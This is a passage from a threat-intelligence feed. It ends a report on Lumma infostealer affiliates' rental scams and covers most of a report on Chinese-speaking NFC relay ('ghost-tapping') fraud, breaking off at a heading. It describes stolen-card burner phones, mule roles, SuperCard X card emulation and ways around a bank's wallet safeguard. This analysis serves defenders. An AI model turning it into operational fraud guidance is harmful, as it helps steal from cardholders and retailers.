        <p>More specifically, the affiliate claimed to have had “bad experiences in the past with people wanting to rent the property,” stating that when they “got to the property, there was no one there,” which resulted in “cancelled business appointments, wasting time and money.” Using this as justification, they asked victims to make payments via Booking.com, asserting that the process was secure and that victims would be refunded if they were dissatisfied with the apartment (see <strong>Figure 20</strong>). Notably, the same URL path (<code>property-aid-63785823-label-gen-832513841233</code>) <a href="https://www.fortian.com.au/blog/unmasking-sophisticated-marketplace-scams.html">observed</a> in this activity was also seen in the final-stage URL of a rental scam campaign reported by Fortian in 2024. In that instance, victims were <a href="https://www.fortian.com.au/blog/unmasking-sophisticated-marketplace-scams.html">deceived</a> into reserving accommodations, and the domain used appears to be a typosquatting variant, <em>booking[.]eu-apt-booking[.]homes</em>, hosted via Cloudflare.</p>

        <p><strong><em>Figure 20</em></strong><em>: Text sent to the target of a Lumma affiliate (Source: Recorded Future)</em></p>
        <p>Insikt Group also uncovered supporting evidence that the affiliate employed a similar scheme: claiming to have escrow agents worldwide, sending victims a payment link to secure a reservation, and promising that the funds would be held safely and transferred to “one of [their] available bank accounts.” In this case, Insikt Group was unable to recover the actual payment link.</p>
        <p>While the affiliate may have created their own accounts on platforms like WG-Gesucht, evidence shows they possess a large number of compromised WG-Gesucht credentials. Insikt Group hypothesizes that at least some of these credentials were stolen through the affiliate’s Lumma infections. In this context, it's important to note that while selling logs is generally lucrative, the value of certain credentials, such as those for platforms like WG-Gesucht, likely comes from their use in follow-on scams rather than direct resale, which may explain why some buyers may show limited interest in them.</p>
        <h2>Outlook</h2>
        <p>Insikt Group’s unique investigation into Lumma affiliates uncovered a large infostealing ecosystem enabled by a diverse set of tools and services, including proxies, VPNs, anti-detect browsers, exploit kits, crypting services, and malware detection tools. During the investigation, Insikt Group identified previously unreported tools and demonstrated how affiliates frequently run multiple scams in parallel, such as rental fraud, while leveraging additional infostealers like Vidar, Stealc, and Meduza Stealer, likely to enhance success rates and reduce the impact of detection or law enforcement disruption. Looking ahead, Lumma affiliates will likely further diversify their presence across specialized and niche forums, integrating more deeply with cryptocurrency-focused platforms and encrypted messaging ecosystems, complicating detection and disruption efforts.</p>
        <p>While many tactics and tools appear standardized across affiliates, who are likely influenced by shared guides provided by the Lumma MaaS operators, meaningful operational differences exist. These nuances are crucial for defenders, as understanding individual affiliate behaviors offers a clearer picture of how specific threats emerge and evolve within a broader ecosystem. In addition, the findings underscore that many Lumma affiliates are not casual participants, but embedded actors with deep ties to the cybercriminal underground. Their adoption of layered tool sets and diversification across malware families suggests both maturity and adaptability.</p>
        <p>Looking ahead, although recent law enforcement efforts temporarily disrupted Lumma’s infrastructure, the group’s swift recovery with minimal changes underscores its resilience and operational discipline. The longer-term impact of the law enforcement efforts on the individual affiliates hinges on Lumma’s ability to rebuild trust and retain them, a goal it pursues through swift restoration of its infrastructure, <a href="https://www.trendmicro.com/en_us/research/25/g/lumma-stealer-returns.html">proactive communication</a>, and likely feature enhancements. More broadly, the recent law enforcement operations underscore how modern cybercriminal operations function as decentralized networks, where even successful disruptions tend to have only short-term effects. Sustained mitigation will require ongoing law enforcement pressure and targeted intelligence to track the evolving tactics of individual affiliates, in addition to seeking to disrupt Lumma’s infrastructure.</p>

            <description><![CDATA[Explore how Chinese-speaking cybercriminals use NFC relay fraud ("ghost-tapping") to exploit mobile wallets, conduct retail fraud, and launder funds via Telegram.]]></description>
            <content:encoded><![CDATA[
        <h2>Executive Summary</h2>
        <p>Ghost-tapping is a relatively new and popular attack vector used mainly by Chinese-speaking threat actors who use Near Field Communication (NFC) relay tactics to commit retail fraud by using stolen payment card details linked to mobile payment services (such as Apple Pay and Google Pay). This technique allows these threat actors to provide mules with stolen payment card details linked to contactless payment systems in person to obtain physical goods, eventually transporting and reselling stolen goods for profit. Insikt Group analysts identified a key threat actor on Telegram, @webu8, advertising burner phones and ghost-tapping services to Chinese-speaking threat groups (hereafter referred to as syndicates) and engaged with threat actors involved in retail fraud campaigns. Even though Huione Guarantee, a Telegram-based criminal marketplace, announced it shut down its operations on May 13, 2025, we observed cybercriminals and syndicates have since been using Huione Guarantee’s existing massive decentralized infrastructure on Telegram to conduct dealings. Chinese-speaking cybercriminals have also pivoted to Xinbi Guarantee and Tudou Guarantee platforms as one-stop shops to recruit ghost-tapping, transportation, reseller, and money laundering mules. We believe that established, Southeast Asia-based criminal groups that have been involved in scamming activities (romance, investment scam, and cryptomining, among others) since 2020 have begun and will continue to incorporate ghost-tapping campaigns into their activities for financial gains.</p>
        <p>This report includes the key findings of our engagement with threat actors, analysis of video demonstrations showcasing ghost-tapping and contactless ATM withdrawals, open-source research, and law enforcement advisories to explain the Chinese ghost-tapping ecosystem. Insikt Group assesses that ghost-tapping campaigns are difficult to detect due to a lack of Know-Your-Customer (KYC) measures at retail stores and because syndicates can send mules claiming to be tourists to purchase physical goods and resell them for profit. These campaigns can negatively impact retail, banking, contactless payment providers, and insurance companies as a result of unauthorized payment card transactions belonging to payment cardholders. Although ghost-tapping campaigns have been widely reported in Singapore due to high-profile arrests, these campaigns can be conducted on a global scale.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Chinese-speaking cybercriminals are using automation to add stolen payment card information to contactless payment wallets, selling burner phones, and providing an unspecified peripheral software capable of relaying payment card details to separate mobile devices to multiple Chinese-speaking criminal syndicates. Syndicates can also send burner phones back to these cybercriminals to recycle them for future retail fraud campaigns.</li>
          <li>Threat actors involved in ghost-tapping activities claim the technique can work worldwide, with some groups likely based in Cambodia and China. Through our engagements, we identified some threat actors that only operate domestically within China and other specific geographical locations such as Singapore, Malaysia, Thailand, and the Philippines.</li>
          <li>Many criminal groups are using ghost-tapping techniques to conduct ATM withdrawals and purchase luxury goods such as jewelry and mobile phones at retail stores. Once these goods have been purchased, threat actors resell them for cash on Telegram channels like Tudou Guarantee, Xinbi Guarantee, and Huione Guarantee.</li>
          <li>Due to the large number of advertisements regarding ghost-tapping campaigns and recruitment of mules to purchase physical goods using ghost-tapping techniques on Huione Guarantee, Xinbi Guarantee, and Tudou Guarantees, we believe a large number of physical goods being sold on these Chinese cybercrime marketplaces are obtained through ghost-tapping techniques.</li>
        </ul>
        <h2>Background</h2>
        <p>“Ghost Tap” is a term <a href="https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay">coined</a> by Threat Fabric. It describes a tactic that threat actors use to cash out money after they have stolen credit card details linked to mobile payment services (such as Google Pay or Apple Pay). It also involves relaying NFC traffic, where cybercriminals phish or procure stolen payment cards and load them onto mobile wallets, which are then used for fraudulent transactions. Insikt Group defines ghost-tapping as NFC relay fraud; ghost-tapping involves criminals using mobile devices to relay payment information from a victim's card or device to a payment terminal without the victim's knowledge. Once the payment card information is stolen and loaded into mobile wallets, criminals can transmit an NFC signal containing payment card information to a different phone and scale the operation, which can greatly boost mobile wallet-related fraud.</p>
        <p>Recorded Future’s Payment Fraud Intelligence team has published a report titled “Mobile Wallet, Phishing, and Scam Nexus Supports Globally Distributed Card Fraud.” The report’s findings show that NFC relay fraud is an emerging and effective attack method that allows cybercriminals to conduct unauthorized transactions using stolen payment card credentials. Threat actors leverage phishing campaigns and malware to compromise payment cards and intercept one-time passwords (OTPs), which are often essential for adding these cards to mobile wallets. By using open-source NFC relay tools, such as <a href="https://github.com/nfcgate/nfcgate">NFCGate</a>, attackers can transmit or relay tokenized card data in real time to other mobile devices. This method allows threat groups based anywhere in the world to:</p>
        <ul>
          <li>Centrally manage phishing campaigns to compromise payment cards belonging to victims in foreign countries and fraudulently activate the cards on mobile wallets under their control</li>
          <li>Relay the NFC traffic of compromised payment cards provisioned on mobile wallets to money mules who conduct fraudulent, tap-to-pay card-present transactions in the victims’ countries</li>
        </ul>
        <p>Ghost-tapping campaigns consist of cyber and physical elements that require cybercriminals and syndicates to collaborate for the scheme to succeed. These cybercriminals use phishing campaigns, mobile malware, and social engineering techniques to obtain payment card credentials and one-time passwords to link payment card credentials belonging to victims to contactless payment systems (such as Apple Pay and Google Pay) on burner phones. The cybercriminals will then proceed to sell the burner phones loaded with payment card information and develop proprietary software capable of relaying payment card data to Chinese-speaking syndicates for ghost-tapping campaigns. In essence, cybercriminals only fulfill the cyber spectrum of ghost-tapping campaigns.</p>
        <p>Syndicates are well-established criminal groups looking to launder their illegally acquired gains through ghost-tapping campaigns. In ghost-tapping campaigns, the role of syndicates is to work closely with cybercriminals, hire mules to purchase physical goods using burner phones loaded with payment card credentials, and eventually resell the physical goods for cash. Syndicates are responsible for hiring mules, establishing their own contacts, strengthening their networks and supply chains to launder money through ghost-tapping campaigns. Syndicates fulfill both the cyber and physical spectrum of ghost-tapping campaigns. In November 2024, The Straits Times <a href="https://www.straitstimes.com/singapore/courts-crime/criminal-groups-from-china-spreading-out-to-south-east-asia-including-s-pore-experts">reported</a> that criminal syndicates from China have been setting up bases in countries such as the Philippines, Australia, and Singapore to launder their gains from illegal activities such as illegal online gambling and scam campaigns as early as 2016.</p>

        <p>According to a <a href="https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay">Threat Fabric</a> report on ghost-tapping, the prerequisites for the tactic to be executed include a mobile device with NFC with stolen payment card data linked to a mobile payment system (most often iOS or Android), two mobile devices with <a href="https://github.com/nfcgate/nfcgate">NFCGate</a> installed, and a server configured to relay the traffic. NFCGate is an Android application meant to capture, analyze, or modify NFC traffic. It can be used as a research tool to reverse engineer protocols or assess the security of protocols against traffic modifications.</p>

          </div>
        </div>
        <p>According to the Singapore Police Force, between October 1 and December 2024, there were 656 reports of <a href="https://www.police.gov.sg/media-room/news/20250217_unauthorised_card_transactions_made_using_contactless_payment_methods_in_singapore">compromised</a> payment cards involving mobile wallets, with losses amounting to at least $1.2 million SGD ($0.93 million USD). Of these cases, at least 502 reports involved compromised payment cards that were linked to Apple Pay. After successfully linking victims’ credit card information to Apple Wallets, mules working for scam syndicates could make in-person purchases using NFC mobile payment methods to buy physical goods in-store, such as high-value electronic items or luxury goods.</p>
        <p>In November 2024, The Straits Times <a href="https://www.straitstimes.com/singapore/scam-syndicates-sending-foreigners-into-singapore-to-cheat-retailers-like-apple-store-and-best-denki">reported</a> about an emerging trend of foreign nationals being sent to Singapore by syndicates to commit payment card fraud at retail outlets across the country. Singaporean authorities also warned retailers about syndicates who has supposedly stolen the payment card details of victims through a series of online phishing scams. Stolen payment card details were then loaded onto an unspecified mobile application, which could be controlled remotely and used for contactless payments that work with point-of-sale (POS) terminals. Foreigners are believed to be recruited by transnational syndicates in their home countries via social messaging platforms and instructed to enter Singapore to buy items such as expensive mobile phones, electronic accessories, luxury goods, jewelry, and gold bars. Investigations from the Singapore Police Force <a href="https://www.straitstimes.com/singapore/courts-crime/jail-for-two-men-linked-to-syndicate-who-came-to-singapore-to-commit-cheating-but-backed-out">revealed</a> that mules recruited by Chinese syndicates also obtained images of fake Japanese passports to be used as proof of identity during the process of in-person purchases at retail stores, and credit card details had been unlawfully obtained through phishing. This case is most likely an example of ghost-tapping, as it involves payment card details loaded onto an unspecified mobile application that can be controlled remotely and used for contactless payments that work with point-of-sale (POS) terminals. The mobile application is most likely used for relaying NFC traffic involving payment card information from another device in real time.</p>
        <p>We observed criminals buying and selling stolen goods on criminal sources, such as the Telegram marketplaces Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee. There have been reports (<a href="https://www.straitstimes.com/singapore/courts-crime/2-men-allegedly-linked-to-overseas-crime-syndicate-charged-with-cheating">1</a>, <a href="https://www.straitstimes.com/singapore/courts-crime/woman-charged-for-alleged-role-in-government-impersonation-scam?_nei=65aae3a1-dd94-4552-9f4d-0a8a64d3d5a2">2</a>) of similar cases using the same TTPs involving individuals belonging to different nationalities. While Chinese syndicates do not explicitly mention selling goods on e-commerce websites, criminals have been known to sell stolen goods on eBay (<a href="https://www.cnbc.com/2022/06/17/the-fight-against-stolen-products-on-amazon-and-facebook-marketplace.html">1</a>), Carousell (<a href="https://www.channelnewsasia.com/singapore/jail-former-engineer-who-stole-computer-items-worth-s62000-imda-901041?cid=fbcna">1</a>), and Mercari (<a href="https://japannews.yomiuri.co.jp/business/companies/20220616-38142/">1</a>), among others. We assess with a high degree of confidence that Chinese syndicates are also selling goods bought with stolen payment card information on e-commerce platforms.</p>

          </div>
        </div>
        <p>A Singapore Police Force <a href="https://www.police.gov.sg/media-room/news/20250217_unauthorised_card_transactions_made_using_contactless_payment_methods_in_singapore">advisory</a> dated February 17, 2025, stated that scammers, who are likely based overseas, obtained card credentials belonging to victims through e-commerce-related phishing websites, including social media advertisements. The advisory states that after obtaining a victim’s payment card credentials, a scammer would then add the card details to the Apple Wallet on their own device. An SMS one-time password (OTP) would be sent to the victim, who is then tricked into entering the OTP into the phishing website operated by the scammer, thereby giving the scammer access to the victim’s payment card. After successfully taking over the victim’s payment card, the scam syndicate would conspire with a money mule to make unauthorized transactions by connecting the mule’s mobile device to the scammer’s Apple Wallet. The money mule would then be able to make in-person purchases using the contactless payment method (NFC) to buy goods in-store. This police advisory is likely describing ghost-tapping, where there is a need to connect the mule’s mobile device to mobile wallets controlled and operated by syndicates remotely.</p>
        <p>In April 2025, two Chinese nationals were <a href="https://www.zaobao.com.sg/realtime/singapore/story20250509-6316228">arrested</a> for smuggling fifteen iPhones into Singapore from China; the individual and an accomplice were instructed by an unspecified syndicate to throw the phones into a trash can outside a local shopping mall. Insikt Group assesses with high confidence that the two individuals are likely transportation mules recruited by a Chinese-speaking syndicate, and the iPhones likely contain stolen payment card credentials that were already linked to Apple Pay. Once retrieved, the syndicate would have used the phones to activate ghost-tapping mules already residing within Singapore, who would then use them to buy physical goods in person. This case is an example of mobile wallet fraud, which involves burner phones loaded with stolen payment card information and does not require the use of NFC relay tactics.</p>
        <h2>Ghost-Tapping and the Criminal Ecosystem</h2>
        <p>Since 2024, Insikt Group has observed Chinese cybercriminals operating on Telegram-based escrow platforms, such as Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee, to advertise criminal services and TTPs from general scamming to cryptomining. Through engagements with threat actors involved in different aspects of criminality, we learned that Chinese-speaking criminals involved in scamming-related activities are now adopting ghost-tapping into their attack vectors. We identified that ghost-tapping threat actors are based in Southeast Asian nations, specifically in Cambodia, and have been selling burner phones loaded with payment card credentials belonging to victims to multiple Chinese-speaking syndicates. A single ghost-tapping criminal group possesses the means and ability to provide essential items such as burner phones and loan proprietary software to multiple Chinese-speaking syndicates. This means that the existence of multiple ghost-tapping criminal groups would be able to facilitate a very large number of Chinese-speaking syndicates for many different ghost-tapping campaigns that target multiple businesses — specifically in the retail sector — globally.</p>
        <p>In addition to advertising ghost-tapping services, we observed Chinese-speaking syndicates recruiting mules to conduct purchases on the three above-mentioned Telegram marketplaces. The syndicates will usually hire Chinese-speaking mules to conduct operations on their behalf, with mules traveling to foreign countries, such as Singapore, under the guise of tourists to purchase high-value physical goods such as gold, luxury items, and mobile phones. Chinese criminal syndicates will then resell the items on three Telegram marketplaces for cash.</p>

        <h3>Definition of Different Types of Threat Actors and Mules in the Ghost-Tapping Ecosystem</h3>
        <p>Through observations, threat actor engagements, and open-source intelligence (OSINT) reporting, Insikt Group defines different types of threat actors and their roles within ghost-tapping campaigns as follows:</p>
        <ul>
          <li><strong>Cybercriminal:</strong> Obtains stolen payment card credentials and links them to contactless payment services such as Apple Pay and Google Pay. Cybercriminals develop software capable of relaying NFC traffic, including payment card data, in real time to other mobile devices, and they typically sell payment card information to syndicates looking to commit retail fraud via ghost-tapping campaigns. Additionally, cybercriminals sell burner phones loaded with stolen payment card credentials to syndicates to commit retail fraud.</li>
          <li><strong>Syndicate:</strong> In charge of recruiting, training, and instructing different mules for specific purposes to ensure operational success. Chinese-speaking syndicate members typically use Telegram to recruit mules on Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee platforms.</li>
          <li><strong>Ghost-Tapping Mule:</strong> Conducts retail fraud using ghost-tapping techniques to obtain physical goods, including gold, luxury items, and mobile phones. Mules often enter other countries as tourists, purchase high-value items, and deliver the items to a transportation mule or the syndicate directly.</li>
          <li><strong>Transportation Mule:</strong> Transports goods within and beyond borders to the desired destination of the syndicate that hired them.</li>
          <li><strong>Reseller Mule:</strong> Sells items bought using stolen payment card credentials for Tether (USDT) on Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee. We assess that such goods could also be transported and sold in different geographical regions for cash.</li>
          <li><strong>Money-Laundering Mule:</strong> Transfers money back to bank accounts of syndicate members. The syndicates have been known to <a href="https://www.straitstimes.com/singapore/courts-crime/money-mules-scam-syndicates-use-telegram-to-recruit-young-people-for-bank-and-singpass-accounts">use Telegram</a> as a platform to recruit money mules.</li>
          <li><strong>Buyer:</strong> Chinese-speaking syndicate offering to buy physical goods such as gold, luxury items, and mobile phones in large quantities with cash on Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee platforms.</li>
        </ul>
        <p>We assess that cybercriminals may undertake multiple roles and work for multiple syndicates simultaneously due to threat actors constantly advertising for the need of 车队 (motorcade), which indicates there is a high demand for different types of mules to fulfill the objectives of syndicates, such as conducting contactless ATM withdrawals, purchasing physical goods using ghost-tapping techniques, transporting, reselling physical goods, and money-laundering operations.</p>
        <p>On Xinbi Guarantee, we observed threat actors offering transportation services for physical goods that can be transported within and across borders for specific countries. For example, the threat actor “路飞” (@OPLuffy888) advertised express transportation services for physical goods on Xinbi Guarantee to transport goods within and beyond Malaysia, Singapore, Indonesia, and Thailand. We also observed “黑猫” (@llan19889) recruiting ATM withdrawal mules and ghost-tapping mules to purchase gold and Apple mobile devices.</p>

        </div>
        <h3>Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee Facilitating Ghost-Tapping Campaigns</h3>
        <p>Huione Guarantee (@hwdb) is a Chinese-language clearnet website that operates under the Huione Group, a financial conglomerate based in Cambodia. Huione Guarantee serves as a platform for thousands of public and private Chinese-language Telegram groups that provide various services that enable cybercriminal activities, providing escrow services to Chinese-speaking cybercriminals. Elliptic <a href="https://www.elliptic.co/blog/huione-largest-ever-illicit-online-marketplace-stablecoin">reported</a> that illicit cryptocurrency-based activities linked to Huione Group reached at least $24 billion. Threat actors advertised the sale of social media and e-commerce accounts, SIM cards, data containing personally identifiable information (PII), malware-as-a-service (MaaS), deepfake technology, KYC bypass services, money-laundering methods and services, and more. For more information about Huione Guarantee, please refer to the Insikt Group report “Huione Guarantee Serves as a One-Stop Shop for Chinese-Speaking Cybercriminals.”</p>
        <p>Despite Huione Guarantee announcing the shutdown of their operations on May 13, 2025, we observed cybercriminals continuing to use Huione Guarantee’s vast infrastructure on Telegram to facilitate criminal activities and dealings. In addition, we observed cybercriminals pivoting to Xinbi Guarantee (@xbdb) and Tudou Guarantee (@tddb), two other Telegram-based marketplaces that function the same way as Huione Guarantee and serve as viable alternatives for Chinese-speaking cybercriminals to continue recruiting members for their cyber, fraud, and scamming campaigns. All deposits have to be made in USDT to a cryptocurrency wallet operated by Xinbi Guarantee and Tudou Guarantee’s customer service representatives.</p>

          </div>
        </div>
        <p>We observed Chinese-speaking cybercriminals advertising first-hand (一道) and second-hand (二道) payment cards on all three Telegram marketplaces for ghost-tapping campaigns. 远程刷卡 refers to remote card swiping, and in this case, it refers to ghost-tapping operations. Cybercriminals typically use USDT to purchase these payment card details belonging to victims, and the cards are advertised to work globally, including with NFC and POS terminals.</p>
        <p>In <strong>Figure 8</strong>, the administrator of Xinbi Guarantee was observed advertising multiple channels involved in ghost-tapping operations on the now-defunct Xinbi Guarantee’s public community channel (新币公群频道; @gqdh). The administrator advertised more than ten different channels involved in ghost-tapping campaigns that include first- and second-hand payment cards, which indicates that multiple cybercriminal groups and Chinese-speaking syndicates are actively participating in such campaigns.</p>

        <h4>Reselling of Goods to Launder Funds</h4>
        <p>On Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee platforms, we observed threat actors offering to purchase and sell physical items obtained through illicit means in large quantities. Chinese-speaking syndicates typically do not specify how and where they obtained such physical items, but through our research, we believe there are two common methods: ghost-tapping campaigns and e-commerce fraud. The e-commerce method is considered more risky due to more digital and physical footprints, as key details such as online card payment details, physical addresses, and phone numbers are required. In comparison, ghost-tapping campaigns are much harder to detect by law enforcement agencies, and mules can travel to foreign countries and purchase physical goods on behalf of syndicates. These in-person transactions performed by mules grant syndicates the advantage of obtaining goods immediately and with greater control, often issuing specific instructions in real time to mules to deliver the goods to specific locations that could remain unknown to authorities for prolonged periods of time.</p>
        <p>Due to the large number of advertisements regarding ghost-tapping campaigns and recruitment of mules to purchase physical goods using ghost-tapping techniques, all being discussed and advertised together on Huione Guarantee, Xinbi Guarantee, and Tudou Guarantees, coupled with OSINT articles and a Singapore Police Force advisory (<a href="https://www.straitstimes.com/singapore/courts-crime/2-men-allegedly-linked-to-overseas-crime-syndicate-charged-with-cheating">1</a>, <a href="https://www.straitstimes.com/singapore/scam-syndicates-sending-foreigners-into-singapore-to-cheat-retailers-like-apple-store-and-best-denki">2</a>, <a href="https://www.police.gov.sg/media-room/news/20250217_unauthorised_card_transactions_made_using_contactless_payment_methods_in_singapore">3</a>) detailing ghost-tapping crimes, we believe with a high degree of confidence that a large number of physical goods being sold on these Chinese cybercrime marketplaces are obtained through ghost-tapping techniques.</p>
        <p>Based on advertisements on the three above-mentioned Telegram channels, Figure 9 illustrates how physical goods get transported and resold for cash as part of money-laundering operations by Chinese-speaking syndicates. It is highly likely that Chinese-speaking syndicates involved in ghost-tapping campaigns will resell physical items bought with stolen payment card credentials for cash.</p>

        <h2>Threat Analysis and Engagements</h2>
        <p>Insikt Group conducted engagements with two Telegram monikers involved in different aspects of the ghost-tapping ecosystem: @webu8 (developer of proprietary software used in ghost-tapping) and @xingma888 (controller and recruiter of mules who purchase and resell luxury goods purchased through ghost-tapping). These engagements gave us valuable insights into the organization, structure, security measures, and TTPs used by these threat actors and their associates.</p>
        <h3>@webu8: Ghost-Tapping Software Developer</h3>
        <h4>Background</h4>
        <p>Insikt Group discovered a public Chinese-language Telegram channel, cvv教学顶端学习禁广告 (@daoshua00), which has 5,695 members as of writing. This channel promotes ghost-tapping and carding-related services, as well as materials used in ghost-tapping campaigns, specifically first-hand phishing materials, penetration techniques, CVV tutorials, ATM card cloning, and exfiltration of databases. The administrators of this channel operate the Telegram handles @webu8 and @xbdb0. We note that @xbdb0 is similar to Xinbi Guarantee’s Telegram channel (@xbdb), and through our engagement with @xbdb0, the threat actor claimed they have connections with Xinbi Guarantee. We observed the administrators posting photos and video demonstrations of ghost-tapping for syndicates interested in conducting ghost-tapping campaigns. The videos and photos mainly consisted of cash, multiple burner mobile phones with compromised payment cards linked to Apple Pay and Google Pay services, cloned payment cards, and POS terminals. Individuals were asked to contact @webu8 for more information. We engaged with @webu8 and managed to get information and the description of the software being used for ghost-tapping purposes.</p>

          </div>
        </div>
        <p>The three images below, shown in <strong>Figure 13</strong>, showcase @webu8’s advertisements on the Telegram channel @daoshua00.</p>
        <p>The first image on the left shows multiple burner phones tagged with linked payment card credentials. Each phone is tagged with a card binding time (day and month the payment card was linked to the burner phone) and the quantity of compromised payment cards linked. The price of each phone is 90 USDT (approximately $90), and each linked card is 41 USDT (approximately $41); a minimum purchase of five burner mobile phones is required. If a burner phone contains ten linked compromised payment cards, the price of the phone is $500 USDT. The burner phone can be purchased in Putian City, Fujian Province, China. The threat actor used the Chinese text 莆田可面基 打速卖通的不要找我！禁止打国内!, which translates to: “Able to meet in Putian, please do not contact me if you use AliExpress! Domestic calls are prohibited!” Insikt Group assessed that such measures are to maintain anonymity and avoid detection by China’s law enforcement agencies, and having in-person meetups would be more secure to build a strong and stable relationship among Chinese cybercriminals. @webu8 also provided a phone recycling service for Chinese-speaking syndicates, likely to load new compromised payment card credentials into existing burner phones. We note that in August 2023, law enforcement agencies in Singapore <a href="https://www.straitstimes.com/singapore/1b-in-cash-and-assets-seized-and-frozen-30-foreigners-probed-for-money-laundering-and-forgery">arrested</a> ten Chinese-speaking syndicate members originating from Fujian, China, and seized assets worth $3 billion Singapore dollars ($2.33 billion USD). The members are linked to unlicensed money lending in China, scams, and remote online gambling operations in the Philippines. Insikt Group is unable to confirm whether @webu8 and @xbdb0 are linked to the same syndicate whose members were arrested in 2023.</p>
        <p>The second image in the middle showcases @webu8 advertising stolen card credentials linked to an unspecified contactless payment system, with payment card values indicating available remaining credit. The threat actor claims these cards are compatible with Apple Pay and Google Pay, have ready stocks for sale, and can be used for ghost-tapping purposes.</p>
        <p>The third image on the right showcases @djdj8884, another ghost-tapping seller, advertising US payment cards with PIN codes obtained from phishing campaigns. The threat actor is seeking to supply newly phished payment cards regularly to Chinese-speaking syndicates. The cards are advertised to be compatible with making payments to purchase physical goods over POS machines. The screenshot shows burner phones loaded with multiple cards, indicating that the buyer can load the payment card information, together with PIN codes, into their own burner phones.</p>

          <div>
            <div><strong><em>Figure 13:</em></strong> <em>@webu8 advertising burner iPhones loaded with stolen payment card credentials; each mobile phone is tagged with a serial number, and all phones are either set to airplane mode or have no SIM cards inside (Source: Telegram)</em></div>
          </div>
        </div>
        <p>From these three images, we observed two business models used by ghost-tapping criminals:</p>
        <ol>
          <li>@webu8 threat group’s business model is to load compromised payment card credentials onto burner phones, getting syndicate members to deal in person with the buyer located in “Putian”, a city in Fujian Province, China. For this business model, the buyer is getting burner phones that are already loaded successfully and ready for ghost-tapping campaigns.</li>
          <li>@djdj8884 threat group’s business model sells compromised payment card credentials in bulk, together with PIN codes to other Chinese-speaking syndicate members, where transactions can be conducted remotely. For this business model, the buyer is responsible for loading compromised payment card credentials into their own burner phones to prepare for future ghost-tapping campaigns. Insikt Group assessed that this business model requires more preparation time, as not all compromised cards can be loaded into a contactless payment system due to varying security measures employed by different banks.</li>
        </ol>
        <p>We also obtained evidence through proprietary means that cybercriminals are automating the process of linking compromised card credentials to contactless payment systems on burner phones. The screenshot below shows automated attempts to add a compromised payment card belonging to DBS Bank to Apple Pay at intervals of every four to eight minutes. In this case, DBS Bank employs a <a href="https://www.dbs.com/newsroom/DBS_introduces_new_Mobile_wallets_security_feature_to_further_protect_customers_from_phishing_frauds">security feature</a> that requires an individual to log in to their mobile application to authorize the authentication of linking their payment cards to a mobile wallet such as Apple Pay or Google Pay. Customers who wish to add their DBS card must first turn on the “Mobile wallets” toggle in Payment Controls within the DBS digibank app. To further protect users, this “Mobile wallets” feature will be automatically turned off if the card is not added to any mobile wallet within ten minutes. However, in the event that an individual’s bank login details are compromised due to mobile malware or through social engineering techniques, this security feature will not be able to prevent cybercriminals from linking compromised payment cards to contactless payment systems.</p>

          </div>
        </div>
        <h4>Engagement</h4>
        <p>Insikt Group engaged with @webu8 to find out more about ghost-tapping. The threat actor claimed that their ghost-tapping technique can be applied in any country and that the scheme involves a type of proprietary software capable of relaying payment card data to other mobile devices, which they develop and update regularly. The threat actor mentioned they would lend the proprietary software to us for free if we purchased compromised payment card credentials from them, and a member of their team would guide us on how to use it.</p>
        <p>From this engagement, we learned that this threat group not only sells burner phones loaded with compromised payment card details, as shown in <strong>Figure 13</strong>, but also sells compromised payment card details directly to other Chinese syndicates through the use of proprietary software capable of relaying payment card information in real time. This criminal group orchestrating ghost-tapping schemes is unwilling to hire mules to conduct retail fraud using ghost-tapping methods by themselves and does not bear any risk of getting caught by law enforcement agencies while conducting retail fraud.</p>
        <p>Chinese-speaking syndicates that purchase compromised payment card information, or burner phones loaded with compromised card information from this ghost-tapping threat group, are responsible for sending ghost-tapping mules to commit retail fraud or contactless NFC ATM withdrawal in person, where mules bear the greatest risk of being arrested by law enforcement agencies.</p>
        <p>Due to the threat actor’s request to meet in person to discuss more business details in Cambodia, we assess with high confidence that well-established Chinese-speaking syndicates operating in Southeast Asia have members physically located in Cambodia who could discuss terms and conditions further. We also interpret the request for a physical meetup as a method used by the threat actor to filter out less-prominent criminal gangs and as a desire to conduct business with more well-established syndicates on a much larger scale to maximize their profits.</p>
        <p>According to <a href="https://www.cleafy.com/cleafy-labs/supercardx-exposing-chinese-speaker-maas-for-nfc-relay-fraud-operation">Cleafy</a>, the “SuperCard X” MaaS offering was created by a Chinese-speaking threat actor and shares similarities with the proprietary software @webu8 mentioned. According to Cleafy, the “Reader” application contains an embedded file that stores multiple “Answer To Reset” (ATR) messages. These messages, typically used to initiate and negotiate communication parameters between a smart card and an NFC reader, are reused to facilitate card emulation. When the "Reader" captures and relays a victim’s card data, the corresponding ATR is transmitted via the command-and-control (C2) infrastructure to the "Tapper" device that is going to use this message to emulate a virtual card, effectively deceiving POS terminals or ATMs into recognizing it as a legitimate physical card. By leveraging ATRs, SuperCard X enables seamless, real-time relay attacks, allowing threat actors to bypass physical proximity constraints and carry out fraudulent transactions. Insikt Group is unable to confirm whether the SuperCard X platform application is the proprietary software used by @webu8 due to the existence of multiple ghost-tapping criminals advertising similar schemes on Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee.</p>
        <p>Cleafy also identified a SuperCard X campaign <a href="https://www.cleafy.com/cleafy-labs/supercardx-exposing-chinese-speaker-maas-for-nfc-relay-fraud-operation">targeting</a> Italy and found evidence that suggests custom builds tailored for specific affiliates or regional operations. This research corroborates @webu8’s claim that their ghost-tapping attack vector could be conducted anywhere in the world and that such proprietary software could be loaned to non-Chinese-speaking syndicates.</p>
        <p>Insikt Group also published a report titled “SuperCard X MaaS Expands Infrastructure, Likely Targeting High-Profile Organizations,” which builds upon Cleafy’s research on the SuperCard X campaign.</p>
        <h3>@xingma888: Reseller and Mule Controller</h3>
        <h4>Background</h4>
